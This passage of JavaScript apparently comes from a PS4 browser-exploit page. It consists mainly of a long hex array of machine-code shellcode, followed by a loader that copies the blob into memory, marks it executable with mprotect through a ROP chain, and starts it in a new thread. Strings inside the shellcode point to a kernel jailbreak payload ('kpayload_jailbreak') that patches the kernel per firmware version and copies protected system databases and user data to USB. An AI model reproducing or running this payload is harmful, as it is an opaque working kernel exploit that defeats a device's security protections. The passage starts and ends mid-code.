3b8b0000,0X26358d48,0X4800001c,0X2112158d,0Xeee80000,0X8b000000,0X358d483b,0X00001c19,0Xf5158d48,0Xe8000020,0X000000d9,0X8d483b8b,0X001c0e35,0X158d4800,0X000020d8,0X0000c4e8,0X483b8b00,0X1c02358d,0X8d480000,0X0020bb15,0X00afe800,0X3b8b0000,0Xf3358d48,0X4800001b,0X209e158d,0X9ae80000,0X8b000000,0X358d483b,0X00001bea,0X81158d48,0Xe8000020,0X00000085,0X8d483b8b,0X001bdb35,0X158d4800,0X00002064,0X000070e8,0X483b8b00,0X1bcc358d,0X8d480000,0X00204715,0X005be800,0X3b8b0000,0Xbe358d48,0X4800001b,0X202a158d,0X46e80000,0X8b000000,0X358d483b,0X00001baf,0X0d158d48,0Xe8000020,0X00000031,0X8d483b8b,0X001ba035,0X158d4800,0X00001ff0,0X00001ce8,0X483b8b00,0X1b92358d,0X8d480000,0X001fd315,0X5d5b5900,0X000004e9,0X5d5b5800,0Xc0c748c3,0X0000024f,0X000b1fe9,0Xc0c74800,0X00000250,0X000b13e9,0X1e0ff300,0Xf18948fa,0X8948d231,0Xc03145fe,0X0252bf50,0Xc0310000,0X000af4e8,0Xf3c35a00,0X48fa1e0f,0X21a6058d,0X63480000,0X48c931d2,0Xe0ff008b,0Xfa1e0ff3,0X55415641,0X53555441,0X48f28948,0X0200ec81,0X8b480000,0X8b4c0847,0X8b484840,0X8b484070,0X8b660842,0X9e3d6600,0Xce840f02,0X0f000004,0X00015f87,0Xda3d6600,0Xb6870f01,0X66000000,0X7701d53d,0X973d664e,0X8d870f01,0X66000000,0X77018f3d,0X633d6665,0Xac840f01,0X66000002,0X0f01723d,0X0002c284,0X5e3d6600,0Xea850f01,0Xb9000005,0Xc0000082,0Xc148320f,0X094820e2,0X888d48d0,0X00b53f30,0X15300548,0X9ce9015c,0X66000006,0X6601d72d,0X0f03f883,0X00034a87,0X158d4800,0X00001be0,0X48c0b70f,0Xb9820463,0Xc0000082,0X3ed00148,0X2d66e0ff,0X83660190,0X870f07f8,0X00000595,0Xc9158d48,0X0f00001b,0X6348c0b7,0X01488204,0Xe0ff3ed0,0X01c23d66,0X02e5840f,0X3d660000,0X840f01c7,0X000002db,0X000568e9,0X2b3d6600,0X87840f02,0X77000003,0Xfb3d664b,0X662c7701,0X0f01f33d,0X00054c86,0Xf42d6600,0Xf8836601,0X3e870f07,0X48000005,0X1b92158d,0Xb70f0000,0X046348c0,0Xd0014882,0X66e0ff3e,0X0f02263d,0X00032984,0X293d6600,0X1f840f02,0Xe9000003,0X00000511,0X026c3d66,0X0370840f,0X23770000,0X02583d66,0X0344840f,0X3d660000,0X840f025a,0X0000033a,0X022c3d66,0X0310840f,0Xe2e90000,0X66000004,0X0f028a3d,0X00036184,0X8b3d6600,0X57840f02,0Xe9000003,0X000004c9,0X03873d66,0X03ff840f,0X870f0000,0X000000c1,0X02f33d66,0X038f840f,0X52770000,0X02bd3d66,0X0363840f,0X23770000,0X02a03d66,0X0337840f,0X3d660000,0X840f02bc,0X0000034d,0X029f3d66,0X0323840f,0X7ee90000,0X66000004,0X0f02ee3d,0X00035484,0Xef3d6600,0X4a840f02,0X66000003,0X0f02be3d,0X00032084,0X045be900,0X3d660000,0X840f0352,0X00000371,0X3d662377,0X840f0321,0X00000345,0X03233d66,0X033b840f,0X3d660000,0X840f0320,0X00000331,0X00042ce9,0X543d6600,0X42840f03,0X66000003,0X0f03843d,0X00041885,0X0082b900,0X320fc000,0X20e2c148,0X48d00948,0Xf6b0888d,0X05480111,0X021efd60,0X0004cae9,0X2e3d6600,0X8e840f04,0X77000003,0Xc03d6652,0X42840f03,0X77000003,0Xb63d6623,0X36840f03,0X66000003,0X0f03b73d,0X00032c84,0X883d6600,0X02840f03,0Xe9000003,0X000003bd,0X03e93d66,0X0333840f,0X3d660000,0X840f041a,0X00000349,0X03e83d66,0X031f840f,0X9ae90000,0X66000003,0X0f047e3d,0X00037084,0X66237700,0X0f044c3d,0X00034484,0X4e3d6600,0X3a840f04,0X66000003,0X0f042f3d,0X00031084,0X036be900,0X3d660000,0X840f04b0,0X00000341,0X04b23d66,0X0337840f,0X52e90000,0Xb9000003,0Xc0000082,0Xc148320f,0X094820e2,0X888d48d0,0X00b53af0,0X11300548,0X04e9015c,0Xb9000004,0Xc0000082,0Xc148320f,0X094820e2,0X888d48d0,0X00b5cf10,0Xd0400548,0Xe4e9015c,0Xb9000003,0Xc0000082,0Xc148320f,0X094820e2,0X888d48d0,0X00c17610,0Xe8500548,0Xc4e901d5,0Xb9000003,0Xc0000082,0Xc148320f,0X094820e2,0X888d48d0,0X00c174e0,0Xe7200548,0Xa4e901d5,0Xb9000003,0Xc0000082,0Xc148320f,0X094820e2,0X888d48d0,0X00c174d0,0Xe7100548,0X84e901d5,0Xb9000003,0Xc0000082,0Xc148320f,0X094820e2,0X888d48d0,0X00c1b4d0,0X27100548,0X64e901d6,0Xb9000003,0Xc0000082,0Xc148320f,0X094820e2,0X888d48d0,0X00d303e0,0X64600548,0X44e901ea,0Xb9000003,0Xc0000082,0Xc148320f,0X094820e2,0X888d48d0,0X00d37270,0Xd1a00548,0X24e901ea,0X0f000003,0Xe2c14832,0Xd0094820,0Xe0888d48,0X4800d372,0Xead21005,0X0309e901,0X82b90000,0X0fc00000,0Xe2c14832,0Xd0094820,0Xe0888d48,0X48010984,0X2c183005,0X02e9e902,0X82b90000,0X0fc00000,0Xe2c14832,0Xd0094820,0Xe0888d48,0X48010984,0X2c18b005,0X02c9e902,0X82b90000,0X0fc00000,0Xe2c14832,0Xd0094820,0Xc0888d48,0X4801133f,0X2ef3b005,0X02a9e902,0X82b90000,0X0fc00000,0Xe2c14832,0Xd0094820,0Xc0888d48,0X4801138f,0X2f33b005,0X0289e902,0X82b90000,0X0fc00000,0Xe2c14832,0Xd0094820,0X98888d48,0X48011392,0X1bf90005,0X0269e902,0X82b90000,0X0fc00000,0Xe2c14832,0Xd0094820,0X98888d48,0X480113d2,0X1c390005,0X0249e902,0X82b90000,0X0fc00000,0Xe2c14832,0Xd0094820,0X38888d48,0Xeb0113d3,0X0082b915,0X320fc000,0X20e2c148,0X48d00948,0Xe358888d,0X05480113,0X02300160,0X000212e9,0X0082b900,0X320fc000,0X20e2c148,0X48d00948,0Xe1d8888d,0X05480113,0X022c5590,0X0001f2e9,0X0082b900,0X320fc000,0X20e2c148,0X48d00948,0Xb568888d,0X05480113,0X01b46220,0X0001d2e9,0X0082b900,0X320fc000,0X20e2c148,0X48d00948,0Xa610888d,0X05480111,0X01b8c570,0X0001b2e9,0X0082b900,0X320fc000,0X20e2c148,0X48d00948,0Xa730888d,0X05480111,0X01c65f90,0X000192e9,0X0082b900,0X320fc000,0X20e2c148,0X48d00948,0Xb680888d,0X05480111,0X021ebd60,0X000172e9,0X0082b900,0X320fc000,0X20e2c148,0X48d00948,0X3610888d,0X05480111,0X021a6a70,0X000152e9,0X0082b900,0X320fc000,0X20e2c148,0X48d00948,0Xb6f0888d,0X05480111,0X01b25a10,0X000132e9,0X0082b900,0X320fc000,0X20e2c148,0X48d00948,0Xb750888d,0X05480111,0X01bf8030,0X000112e9,0X0082b900,0X320fc000,0X20e2c148,0X48d00948,0Xf670888d,0X05480111,0X02116480,0X0000f2e9,0X0082b900,0X320fc000,0X20e2c148,0X48d00948,0Xf858888d,0X05480111,0X02136cd0,0X0000d2e9,0X48c03100,0X40b9e789,0X48000000,0X1a7a2d8d,0X89480000,0X4cabf3e3,0X14be2d8d,0Xb9410000,0X00000068,0X51058d4c,0X4c000016,0X8d48e989,0X0006d015,0X0100be00,0X89480000,0X0055ffdf,0X59bfc931,0X41000002,0X8948c689,0Xbec031da,0X00000007,0X000424e8,0X258d4c00,0X00001670,0X243c8b41,0X0b78ff85,0X48f28944,0X18e8de89,0X31fffff9,0Xdf8948c0,0X000080b9,0Xe3894800,0Xb941abf3,0X00000068,0Xed058d4c,0X4c000015,0X8d48e989,0X00145a15,0X0200be00,0X89480000,0X0055ffdf,0X59bfc931,0X89000002,0Xda8948c5,0X07bec031,0Xe8000000,0X000003c1,0X243c8b41,0X0a78ff85,0X8948ea89,0Xf8bde8de,0Xc883ffff,0X3153ebff,0Xc93145d2,0X04568948,0X18968b48,0X45000001,0X8944d231,0Xbb48144e,0X00000013,0X38010000,0X48128944,0X8948118b,0X8b483056,0X40894900,0X40894920,0X878b4818,0X00000130,0X6040c748,0Xffffffff,0X58588948,0X6840c748,0Xffffffff,0X8148c031,0X000200c4,0X415d5b00,0X415d415c,0X0ff3c35e,0X4853fa1e,0X13d21d8d,0X89480000,0X01ffbadf,0X01be0000,0Xe8000000,0Xffffea2d,0Xc031c789,0X1278ff85,0Xffea2ce8,0Xdf8948ff,0Xffea30e8,0X0001b8ff,0Xc35b0000,0Xfa1e0ff3,0X54415541,0X81485355,0X0000d8ec,0X2d8d4800,0X000019bc,0X00458b66,0X0fc08566,0X00016085,0X258d4c00,0X000018f0,0X245c8d48,0X158d482f,0X00001644,0X242c8b4d,0X894812ff,0X158d48df,0X0000136d,0Xbec18948,0X00000021,0Xff41c031,0X31d231d5,0Xdf8948f6,0Xffe9b0e8,0X89c085ff,0X311e79c3,0X48f631d2,0X135c3d8d,0X9ae80000,0X85ffffe9,0X79c389c0,0Xffc88308,0X000100e9,0X31d23100,0Xe8df89f6,0Xffffea59,0X24748d48,0X0020ba08,0Xdf890000,0Xffe958e8,0Xf88348ff,0X44d67520,0X246cb70f,0X89d23120,0Xc5ff49df,0X05e5c149,0Xe8ee894c,0Xffffea29,0X24748d48,0X0040ba50,0Xdf890000,0Xffe928e8,0Xf88348ff,0X0fa67540,0X862484b7,0X0f000000,0X8824b4b7,0X0f000000,0Xb70ff0af,0X00842484,0X63480000,0Xee014cf6,0Xf7c60148,0X00000fc6,0X48057400,0Xf3ebc6ff,0Xdf89d231,0Xffe9d8e8,0Xb48d48ff,0X00009024,0X0040ba00,0Xdf890000,0Xffe8d4e8,0Xf88348ff,0X4e850f40,0X89ffffff,0X5c8d48df,0Xe2e80324,0X48ffffe8,0Xa8248c8b,0X31000000,0X244489c0,0X2444c603,0X8d480007,0X00129615,0X0005be00,0X89480000,0Xc88949df,0X28e9c148,0X20e8c149,0X45c9b60f,0X31c0b60f,0X14ff41c0,0X058d4824,0X00001748,0Xffdf8948,0X45896610,0Xc4814800,0X000000d8,0X5c415d5b,0Xf3c35d41,0X55fa1e0f,0Xec834853,0X48c03118,0X08247c89,0Xfffe57e8,0X2d8d48ff,0X0000177c,0X3f358d48,0X0f000012,0X8b48d0b7,0X8908247c,0Xffc031d3,0X83660055,0X8b4809fb,0X7708247c,0X17be0f13,0X1e358d48,0X31000012,0X0055ffc0,0X65ebc031,0X63fb8366,0Xbe0f1577,0X8d48014f,0X00120a35,0X17be0f00,0X55ffc031,0X66e1eb00,0X03e7fb81,0Xbe0f1a77,0X8d48014f,0X0011f535,0X17be0f00,0X0f44c031,0Xff0247be,0Xc0eb0055,0X66ffc883,0X270ffb81,0Xbe0f1f77,0X8d48014f,0X0011d935,0X17be0f00,0X0f44c031,0X44034fbe,0X0247be0f,0Xeb0055ff,0Xc4834897,0Xc35d5b18,0Xfa1e0ff3,0X18ec8348,0X67e8c031,0X89fffffd,0X85c031c2,0Xe81b75d2,0Xfffffd94,0Xbd3d8d48,0X48fffff5,0X0e24748d,0X24448966,0Xebfce80e,0X8348ffff,0Xf3c318c4,0X53fa1e0f,0X5d1d8d48,0X83000017,0X3375003b,0Xdd058d48,0X31000014,0X48f631d2,0X116e3d8d,0X31450000,0Xc03145c9,0X10ffc931,0X29158d48,0X48000017,0X117c358d,0Xc7890000,0X1ae80389,0X48fffff5,0X171a1d8d,0X3b830000,0X48347500,0X149e058d,0Xd2310000,0X8d48f631,0X00117e3d,0Xc9314500,0X31c03145,0X4810ffc9,0X16e2158d,0X8d480000,0X00119235,0X5b038900,0Xdae9c789,0X5bfffff4,0Xc03148c3,0X0fca8949,0Xc3017205,0X6c3d8348,0X00000014,0Xff501874,0X00146315,0X08895900,0Xffc0c748,0X48ffffff,0Xffffc2c7,0X00c3ffff,0X7379732f,0X5f6d6574,0X61746164,0X6972702f,0X6d6d2f76,0X70612f73,0X61622e70,0X732f006b,0X65747379,0X61645f6d,0X702f6174,0X2f766972,0X2f736d6d,0X63646461,0X2e746e6f,0X006b6162,0X7379732f,0X5f6d6574,0X61746164,0X6972702f,0X6d6d2f76,0X76612f73,0X6e6f635f,0X746e6574,0X2e67625f,0X006b6162,0X6573752f,0X79732f72,0X6d657473,0X6265772f,0X2f74696b,0X75636573,0X612f6572,0X61637070,0X2f656863,0X6c707041,0X74616369,0X436e6f69,0X65686361,0X6b61622e,0X73752f00,0X732f7265,0X65747379,0X65772f6d,0X74696b62,0X6265772f,0X776f7262,0X2f726573,0X63707061,0X65686361,0X7070412f,0X6163696c,0X6e6f6974,0X68636143,0X61622e65,0X732f006b,0X65747379,0X61645f6d,0X702f6174,0X2f766972,0X2f736d6d,0X2e707061,0X2f006264,0X74737973,0X645f6d65,0X2f617461,0X76697270,0X736d6d2f,0X6464612f,0X746e6f63,0X0062642e,0X7379732f,0X5f6d6574,0X61746164,0X6972702f,0X6d6d2f76,0X76612f73,0X6e6f635f,0X746e6574,0X2e67625f,0X2f006264,0X72657375,0X7379732f,0X2f6d6574,0X6b626577,0X732f7469,0X72756365,0X70612f65,0X63616370,0X412f6568,0X696c7070,0X69746163,0X61436e6f,0X2e656863,0X2f006264,0X72657375,0X7379732f,0X2f6d6574,0X6b626577,0X772f7469,0X72626265,0X6573776f,0X70612f72,0X63616370,0X412f6568,0X696c7070,0X69746163,0X61436e6f,0X2e656863,0X2f006264,0X2f746e6d,0X30627375,0X72702e2f,0X0065626f,0X746e6d2f,0X6273752f,0X702e2f31,0X65626f72,0X00732500,0X65746e49,0X6c616e72,0X63616220,0X2070756b,0X706d6f63,0X6574656c,0X68540a2e,0X77207369,0X6f207361,0X20796c6e,0X61642061,0X61626174,0X62206573,0X756b6361,0X75202c70,0X61206573,0X42535520,0X76656420,0X20656369,0X20726f66,0X75662061,0X62206c6c,0X756b6361,0X500a2e70,0X46203453,0X776d7269,0X20657261,0X73007325,0X6372756f,0X616d2f65,0X632e6e69,0X45445b00,0X5d475542,0X73255b20,0X3a732520,0X005d6425,0X544f4e5b,0X43494649,0X4f495441,0X25203a4e,0X25282073,0X64253a73,0X203a5d29,0X000a7325,0X6b636142,0X20676e69,0X74207075,0X5355206f,0X500a3142,0X46203453,0X776d7269,0X20657261,0X2f007325,0X2f746e6d,0X31627375,0X3453502f,0X6d2f002f,0X752f746e,0X2f316273,0X2f345350,0X6b636142,0X002f7075,0X746e6d2f,0X6273752f,0X53502f31,0X61422f34,0X70756b63,0X7070612f,0X0062642e,0X746e6d2f,0X6273752f,0X53502f31,0X61422f34,0X70756b63,0X6464612f,0X746e6f63,0X0062642e,0X746e6d2f,0X6273752f,0X53502f31,0X61422f34,0X70756b63,0X5f76612f,0X746e6f63,0X5f746e65,0X642e6762,0X6d2f0062,0X752f746e,0X2f316273,0X2f345350,0X6b636142,0X552f7075,0X44726573,0X2f617461,0X6e6d2f00,0X73752f74,0X502f3162,0X422f3453,0X756b6361,0X73552f70,0X61447265,0X732f6174,0X65747379,0X61645f6d,0X002f6174,0X746e6d2f,0X6273752f,0X53502f31,0X61422f34,0X70756b63,0X6573552f,0X74614472,0X79732f61,0X6d657473,0X7461645f,0X61732f61,0X61646576,0X2f006174,0X2f746e6d,0X31627375,0X3453502f,0X6361422f,0X2f70756b,0X72657355,0X61746144,0X7379732f,0X5f6d6574,0X61746164,0X6972702f,0X6d2f0076,0X752f746e,0X2f316273,0X2f345350,0X6b636142,0X552f7075,0X44726573,0X2f617461,0X74737973,0X645f6d65,0X2f617461,0X76697270,0X6d6f682f,0X6d2f0065,0X752f746e,0X2f316273,0X2f345350,0X6b636142,0X552f7075,0X44726573,0X2f617461,0X74737973,0X645f6d65,0X2f617461,0X76697270,0X63696c2f,0X65736e65,0X6e6d2f00,0X73752f74,0X502f3162,0X422f3453,0X756b6361,0X73552f70,0X61447265,0X732f6174,0X65747379,0X61645f6d,0X702f6174,0X2f766972,0X69746361,0X69746176,0X2f006e6f,0X2f746e6d,0X31627375,0X3453502f,0X6361422f,0X2f70756b,0X72657355,0X61746144,0X6573752f,0X2f002f72,0X2f746e6d,0X31627375,0X3453502f,0X6361422f,0X2f70756b,0X72657355,0X61746144,0X6573752f,0X6f682f72,0X002f656d,0X746e6d2f,0X6273752f,0X53502f31,0X61422f34,0X70756b63,0X6573552f,0X74614472,0X73752f61,0X742f7265,0X68706f72,0X6d2f0079,0X752f746e,0X2f316273,0X2f345350,0X6b636142,0X552f7075,0X44726573,0X2f617461,0X72657375,0X63696c2f,0X65736e65,0X6e6d2f00,0X73752f74,0X502f3162,0X422f3453,0X756b6361,0X73552f70,0X61447265,0X752f6174,0X2f726573,0X74746573,0X73676e69,0X6e6d2f00,0X73752f74,0X502f3162,0X422f3453,0X756b6361,0X73552f70,0X61447265,0X752f6174,0X2f726573,0X74737973,0X2f006d65,0X2f746e6d,0X31627375,0X3453502f,0X6361422f,0X2f70756b,0X72657355,0X61746144,0X6573752f,0X79732f72,0X6d657473,0X6265772f,0X0074696b,0X746e6d2f,0X6273752f,0X53502f31,0X61422f34,0X70756b63,0X6573552f,0X74614472,0X73752f61,0X732f7265,0X65747379,0X65772f6d,0X74696b62,0X6365732f,0X00657275,0X746e6d2f,0X6273752f,0X53502f31,0X61422f34,0X70756b63,0X6573552f,0X74614472,0X73752f61,0X732f7265,0X65747379,0X65772f6d,0X74696b62,0X6265772f,0X776f7262,0X00726573,0X79706f43,0X20676e69,0X72657375,0X74616420,0X6c500a61,0X65736165,0X69617720,0X2e2e2e74,0X79732f00,0X6d657473,0X7461645f,0X61732f61,0X61646576,0X2f006174,0X2f746e6d,0X31627375,0X3453502f,0X6361422f,0X2f70756b,0X72657355,0X61746144,0X6573752f,0X6f682f72,0X2f00656d,0X72657375,0X6d6f682f,0X752f0065,0X2f726573,0X706f7274,0X2f007968,0X72657375,0X63696c2f,0X65736e65,0X73752f00,0X732f7265,0X69747465,0X0073676e,0X6573752f,0X79732f72,0X6d657473,0X6265772f,0X2f74696b,0X75636573,0X2f006572,0X72657375,0X7379732f,0X2f6d6574,0X6b626577,0X772f7469,0X72626265,0X6573776f,0X732f0072,0X65747379,0X61645f6d,0X702f6174,0X2f766972,0X656d6f68,0X79732f00,0X6d657473,0X7461645f,0X72702f61,0X6c2f7669,0X6e656369,0X2f006573,0X74737973,0X645f6d65,0X2f617461,0X76697270,0X7463612f,0X74617669,0X006e6f69,0X20425355,0X6b636162,0X63207075,0X6c706d6f,0X21657465,0X63614200,0X676e696b,0X20707520,0X55206f74,0X0a304253,0X20345350,0X6d726946,0X65726177,0X00732520,0X746e6d2f,0X6273752f,0X53502f30,0X2f002f34,0X2f746e6d,0X30627375,0X3453502f,0X6361422f,0X2f70756b,0X6e6d2f00,0X73752f74,0X502f3062,0X422f3453,0X756b6361,0X70612f70,0X62642e70,0X6e6d2f00,0X73752f74,0X502f3062,0X422f3453,0X756b6361,0X64612f70,0X6e6f6364,0X62642e74,0X6e6d2f00,0X73752f74,0X502f3062,0X422f3453,0X756b6361,0X76612f70,0X6e6f635f,0X746e6574,0X2e67625f,0X2f006264,0X2f746e6d,0X30627375,0X3453502f,0X6361422f,0X2f70756b,0X72657355,0X61746144,0X6d2f002f,0X752f746e,0X2f306273,0X2f345350,0X6b636142,0X552f7075,0X44726573,0X2f617461,0X74737973,0X645f6d65,0X2f617461,0X6e6d2f00,0X73752f74,0X502f3062,0X422f3453,0X756b6361,0X73552f70,0X61447265,0X732f6174,0X65747379,0X61645f6d,0X732f6174,0X64657661,0X00617461,0X746e6d2f,0X6273752f,0X53502f30,0X61422f34,0X70756b63,0X6573552f,0X74614472,0X79732f61,0X6d657473,0X7461645f,0X72702f61,0X2f007669,0X2f746e6d,0X30627375,0X3453502f,0X6361422f,0X2f70756b,0X72657355,0X61746144,0X7379732f,0X5f6d6574,0X61746164,0X6972702f,0X6f682f76,0X2f00656d,0X2f746e6d,0X30627375,0X3453502f,0X6361422f,0X2f70756b,0X72657355,0X61746144,0X7379732f,0X5f6d6574,0X61746164,0X6972702f,0X696c2f76,0X736e6563,0X6d2f0065,0X752f746e,0X2f306273,0X2f345350,0X6b636142,0X552f7075,0X44726573,0X2f617461,0X74737973,0X645f6d65,0X2f617461,0X76697270,0X7463612f,0X74617669,0X006e6f69,0X746e6d2f,0X6273752f,0X53502f30,0X61422f34,0X70756b63,0X6573552f,0X74614472,0X73752f61,0X002f7265,0X746e6d2f,0X6273752f,0X53502f30,0X61422f34,0X70756b63,0X6573552f,0X74614472,0X73752f61,0X682f7265,0X2f656d6f,0X6e6d2f00,0X73752f74,0X502f3062,0X422f3453,0X756b6361,0X73552f70,0X61447265,0X752f6174,0X2f726573,0X706f7274,0X2f007968,0X2f746e6d,0X30627375,0X3453502f,0X6361422f,0X2f70756b,0X72657355,0X61746144,0X6573752f,0X696c2f72,0X736e6563,0X6d2f0065,0X752f746e,0X2f306273,0X2f345350,0X6b636142,0X552f7075,0X44726573,0X2f617461,0X72657375,0X7465732f,0X676e6974,0X6d2f0073,0X752f746e,0X2f306273,0X2f345350,0X6b636142,0X552f7075,0X44726573,0X2f617461,0X72657375,0X7379732f,0X006d6574,0X746e6d2f,0X6273752f,0X53502f30,0X61422f34,0X70756b63,0X6573552f,0X74614472,0X73752f61,0X732f7265,0X65747379,0X65772f6d,0X74696b62,0X6e6d2f00,0X73752f74,0X502f3062,0X422f3453,0X756b6361,0X73552f70,0X61447265,0X752f6174,0X2f726573,0X74737973,0X772f6d65,0X696b6265,0X65732f74,0X65727563,0X6e6d2f00,0X73752f74,0X502f3062,0X422f3453,0X756b6361,0X73552f70,0X61447265,0X752f6174,0X2f726573,0X74737973,0X772f6d65,0X696b6265,0X65772f74,0X6f726262,0X72657377,0X6e6d2f00,0X73752f74,0X502f3062,0X422f3453,0X756b6361,0X73552f70,0X61447265,0X752f6174,0X2f726573,0X656d6f68,0X6d786300,0X2f2f3a6c,0X6f6e7370,0X69666974,0X69746163,0X742f6e6f,0X695f7865,0X5f6e6f63,0X74737973,0X2e006d65,0X002e2e00,0X252f7325,0X696c0073,0X72656b62,0X2e6c656e,0X78727073,0X62696c00,0X6e72656b,0X775f6c65,0X732e6265,0X00787270,0X6b62696c,0X656e7265,0X79735f6c,0X70732e73,0X5f007872,0X6174735f,0X635f6b63,0X675f6b68,0X64726175,0X735f5f00,0X6b636174,0X6b68635f,0X6961665f,0X5f5f006c,0X6f727265,0X63730072,0X72654b65,0X456c656e,0X726f7272,0X65637300,0X6e72654b,0X6f4c6c65,0X74536461,0X4d747261,0X6c75646f,0X63730065,0X72654b65,0X416c656e,0X636f6c6c,0X44657461,0X63657269,0X6d654d74,0X0079726f,0X4b656373,0X656e7265,0X70614d6c,0X65726944,0X654d7463,0X79726f6d,0X65637300,0X6e72654b,0X65476c65,0X72694474,0X4d746365,0X726f6d65,0X7a695379,0X63730065,0X72654b65,0X536c656e,0X00746174,0X4b656373,0X656e7265,0X65704f6c,0X6373006e,0X72654b65,0X526c656e,0X00646165,0X4b656373,0X656e7265,0X65734c6c,0X73006b65,0X654b6563,0X6c656e72,0X736f6c43,0X63730065,0X72654b65,0X536c656e,0X7065656c,0X65637300,0X6e72654b,0X73556c65,0X7065656c,0X65637300,0X6e72654b,0X65476c65,0X6d697474,0X64666f65,0X73007961,0X654b6563,0X6c656e72,0X50746547,0X65636f72,0X69547373,0X7300656d,0X654b6563,0X6c656e72,0X43746547,0X65727275,0X7043746e,0X79730075,0X6c746373,0X73797300,0X626c7463,0X6d616e79,0X79730065,0X63726173,0X78650068,0X65766365,0X68747000,0X64616572,0X6c65735f,0X74700066,0X61657268,0X65735f64,0X66666174,0X74696e69,0X706e5f79,0X65637300,0X6e72654b,0X72436c65,0X65746165,0X65757145,0X73006575,0X654b6563,0X6c656e72,0X656c6544,0X71456574,0X65756575,0X65637300,0X6e72654b,0X64416c65,0X65735564,0X65764572,0X7300746e,0X654b6563,0X6c656e72,0X52646441,0X45646165,0X746e6576,0X74656700,0X00646975,0X67746567,0X67006469,0X69707465,0X65730064,0X64697574,0X74657300,0X00646967,0X72746573,0X64697565,0X74657300,0X69676572,0X63730064,0X72654b65,0X536c656e,0X4e646e65,0X6669746f,0X74616369,0X526e6f69,0X65757165,0X73007473,0X654b6563,0X6c656e72,0X46746547,0X6e615373,0X786f6264,0X646e6152,0X6f576d6f,0X73006472,0X654b6563,0X6c656e72,0X53746547,0X65747379,0X5677536d,0X69737265,0X73006e6f,0X654b6563,0X6c656e72,0X43746547,0X65547570,0X7265706d,0X72757461,0X696c0065,0X65635362,0X6362694c,0X65746e49,0X6c616e72,0X7270732e,0X616d0078,0X636f6c6c,0X65726600,0X61630065,0X636f6c6c,0X61657200,0X636f6c6c,0X6d656d00,0X67696c61,0X656d006e,0X7465736d,0X6d656d00,0X00797063,0X636d656d,0X6d00706d,0X6f6d6d65,0X6d006576,0X6f6d6d65,0X735f6576,0X72747300,0X00797063,0X6e727473,0X00797063,0X6e727473,0X5f797063,0X74730073,0X74616372,0X72747300,0X7461636e,0X72747300,0X006e656c,0X63727473,0X7300706d,0X636e7274,0X7300706d,0X6e697270,0X73006674,0X6972706e,0X0066746e,0X72706e73,0X66746e69,0X7300735f,0X6e616373,0X74730066,0X6c6f7472,0X72747300,0X006b6f74,0X63727473,0X73007268,0X63727274,0X73007268,0X74737274,0X74730072,0X70756472,0X646e6900,0X72007865,0X65646e69,0X73690078,0X69676964,0X74610074,0X6100696f,0X00666f74,0X6c727473,0X00797063,0X65727473,0X726f7272,0X65475f00,0X74637074,0X00657079,0X6f74535f,0X62006c75,0X79706f63,0X69656300,0X7273006c,0X00646e61,0X646e6172,0X63736100,0X656d6974,0X63736100,0X656d6974,0X6300725f,0X656d6974,0X69746300,0X725f656d,0X6d697400,0X6d670065,0X656d6974,0X746d6700,0X5f656d69,0X6f6c0073,0X746c6163,0X00656d69,0X61636f6c,0X6d69746c,0X00725f65,0X69746b6d,0X6f00656d,0X646e6570,0X72007269,0X64646165,0X72007269,0X64646165,0X725f7269,0X6c657400,0X7269646c,0X65657300,0X7269646b,0X77657200,0X64646e69,0X63007269,0X65736f6c,0X00726964,0X66726964,0X65670064,0X6f727074,0X6d616e67,0X6f660065,0X006e6570,0X61657266,0X77660064,0X65746972,0X65736600,0X66006b65,0X6c6c6574,0X6c636600,0X0065736f,0X69727066,0X0066746e,0X72756f73,0X702f6563,0X6f6c7961,0X755f6461,0X736c6974,0X2500632e,0X25282073,0X64253a73,0X6e552029,0X70707573,0X6574726f,0X69662064,0X61776d72,0X000a6572,0X6573752f,0X6a2e2f72,0X626c6961,0X6b616572,0X73252f00,0X6d6f632f,0X2f6e6f6d,0X2f62696c,0X6362696c,0X7270732e,0X732f0078,0X65747379,0X6f632f6d,0X6e6f6d6d,0X62696c2f,0X62696c2f,0X70732e63,0X25007872,0X786c3230,0X6c323025,0X69250078,0X302e3000,0X30006325,0X2563252e,0X63250063,0X2563252e,0X63250063,0X252e6325,0X00632563,0X7379732f,0X2f6d6574,0X6d6d6f63,0X6c2f6e6f,0X6c2f6269,0X63536269,0X73795365,0X6c697455,0X7270732e,0X63730078,0X73795365,0X6c697455,0X646e6553,0X74737953,0X6f4e6d65,0X69666974,0X69746163,0X69576e6f,0X65546874,0X2f007478,0X74737973,0X632f6d65,0X6f6d6d6f,0X696c2f6e,0X696c2f62,0X65635362,0X74737953,0X65536d65,0X63697672,0X70732e65,0X73007872,0X79536563,0X6d657473,0X76726553,0X4c656369,0X636e7561,0X62655768,0X776f7242,0X00726573,0X69616d5f,0X0000006e,0Xffffe783,0Xffffe783,0Xffffe783,0Xffffe783,0Xffffe6b3,0Xffffe6b3,0Xffffe9c5,0Xffffe9c5,0Xffffe9c5,0Xffffe6d3,0Xffffe6f3,0Xffffe713,0Xffffe76e,0Xffffe76e,0Xffffe9a5,0Xffffe78e,0Xffffe9a5,0Xffffe78e,0Xffffe9a5,0Xffffe78e,0X7961706b,0X64616f6c,0X69616a5f,0X6572626c,0X00006b61,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000001,0X00000001,0X00000001,0X00000000,0X00000000,0X00000000,0X00000000,0Xffffffff,0X00000003,0X00000000,0X00003c78,0X00000000,0X00000015,0X00000000,0X00000000,0X00000000,0X00000006,0X00000000,0X00003b48,0X00000000,0X0000000b,0X00000000,0X00000018,0X00000000,0X00000005,0X00000000,0X00003b60,0X00000000,0X0000000a,0X00000000,0X00000001,0X00000000,0X6ffffef5,0X00000000,0X00003b68,0X00000000,0X0000001e,0X00000000,0X00000008,0X00000000,0X6ffffffb,0X00000000,0X08000001,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00003b88,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000];
	var bufLen = payload.length * 4
	var payload_loader = p.malloc32(bufLen);
	var loader_writer = payload_loader.backing;
	for(var i=0; i < payload.length; i++)
	{
		loader_writer[i] = payload[i];
	}
	chain.syscall(74, payload_loader, bufLen, (0x1 | 0x2 | 0x4));
	var pthread = p.malloc(0x10);
	chain.call(libKernelBase.add32(OFFSET_lk_pthread_create), pthread, 0x0, payload_loader, payload_buffer);
	showMessage("Payload Loaded.");
}

function sleep(ms) {
